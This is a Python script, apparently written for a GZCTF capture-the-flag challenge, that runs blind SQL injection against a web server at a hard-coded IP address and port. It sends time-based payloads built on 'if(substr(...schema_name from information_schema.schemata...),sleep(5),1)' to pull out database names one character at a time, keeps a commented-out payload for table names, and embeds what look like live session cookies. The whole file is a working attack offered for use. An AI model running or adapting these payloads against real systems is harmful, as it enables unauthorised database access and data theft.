import time


import requests

cookies = {
    'GZCTF_Token': 'CfDJ8EfNcBTLzh1Cg6VsLTy4ghhGb-65_iNuFdtKAENXGM11LQFnS7bDg5cLELGQUcD0eMNHjvrHAsIK0_8PA6yeHQUShClf2LjR9anwKFRoDI0NYG48H1OhSCrXW0n2OOU0d-s8Y-1BHmmDZYrPiuzOvteIz0g_-rx5Hj9N4z-TTeSeDyPuvSwz-0BYyg3Sl9h3807EKH1T-wA7Q0X5XdTp_hn5XPFitYsTD9vngVz8zLsMFDhxbgkskWhpTi76437RoUAVFCw7E6_kMIxNh4-ebc0PDRTLVTxFAKig8J85vvPjxXLttt2a9akSheK-fQ8Bx_n9xZG_NoG8roDQBSL_XHj898vmQQsvyxrnacXoQ7AMvs5TmItD2H6TJ9n0PmrdhvQtpWEc-CD0pKEVb82oxcjH2fuZvaLOurWW-gQF00XWuaSeDGOGWRx4knTp7XhnyzT05PxrA2Qdv4nfPRuHdf7-MnT2DOEmEJe2i2s9S15ejvHF-J63CK_3nIdqxZWpG4HAO6nb9vgmPagHvbsml1JZf-0ouhdXPKO9wl8EgeQH8rg8iWLhjvtAHz3nxMEmyDbd57eA2E5bY6BPFQbR64Yrb5BPF75xbfmNyLXAPUAldrQtG1Q3uiQbTeuTE9D4aJpo_iAFH4uJTexFn31RpO2qaAiz7tINmDbtVsnXS2P62kY-R0wRi3PDhCU22hkIb-DP5hnFrWzTPlM_ftXGRd5xjwwjcllKKP3S7u6NtYTu',
    'PHPSESSID': '3f99ff2ad88f394f868630a24b113c6d',
}

headers = {
    'Host': '8.134.167.231:45003',
    # 'Content-Length': '7',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://8.134.167.231:45003',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://8.134.167.231:45003/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    # 'Cookie': 'GZCTF_Token=CfDJ8EfNcBTLzh1Cg6VsLTy4ghhGb-65_iNuFdtKAENXGM11LQFnS7bDg5cLELGQUcD0eMNHjvrHAsIK0_8PA6yeHQUShClf2LjR9anwKFRoDI0NYG48H1OhSCrXW0n2OOU0d-s8Y-1BHmmDZYrPiuzOvteIz0g_-rx5Hj9N4z-TTeSeDyPuvSwz-0BYyg3Sl9h3807EKH1T-wA7Q0X5XdTp_hn5XPFitYsTD9vngVz8zLsMFDhxbgkskWhpTi76437RoUAVFCw7E6_kMIxNh4-ebc0PDRTLVTxFAKig8J85vvPjxXLttt2a9akSheK-fQ8Bx_n9xZG_NoG8roDQBSL_XHj898vmQQsvyxrnacXoQ7AMvs5TmItD2H6TJ9n0PmrdhvQtpWEc-CD0pKEVb82oxcjH2fuZvaLOurWW-gQF00XWuaSeDGOGWRx4knTp7XhnyzT05PxrA2Qdv4nfPRuHdf7-MnT2DOEmEJe2i2s9S15ejvHF-J63CK_3nIdqxZWpG4HAO6nb9vgmPagHvbsml1JZf-0ouhdXPKO9wl8EgeQH8rg8iWLhjvtAHz3nxMEmyDbd57eA2E5bY6BPFQbR64Yrb5BPF75xbfmNyLXAPUAldrQtG1Q3uiQbTeuTE9D4aJpo_iAFH4uJTexFn31RpO2qaAiz7tINmDbtVsnXS2P62kY-R0wRi3PDhCU22hkIb-DP5hnFrWzTPlM_ftXGRd5xjwwjcllKKP3S7u6NtYTu; PHPSESSID=3f99ff2ad88f394f868630a24b113c6d',
}


dbstr="abcdefghjiklmnopqrstuvwxyz0123456789"
dbsname=[]
for i in range(3,5):
    dbs_name=""
    for j in range(10):
        for k in dbstr:
            # f"?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='security') limit {i},1,{j},1)=\'{k}\'--+"

            data = {"id": f"1 and if((substr((select schema_name from information_schema.schemata limit {i},1),{j},1)=\'{k}\'),sleep(5),1)"}
            print(data)
            start_time=time.time()
            res=requests.post('http://8.134.167.231:45003/', cookies=cookies, headers=headers, data=data, verify=False)
            end_time=time.time()
            if 'query_success' in res.text:
                dbs_name+=k
                print(dbs_name)
    dbsname.append(dbs_name)
print(dbsname)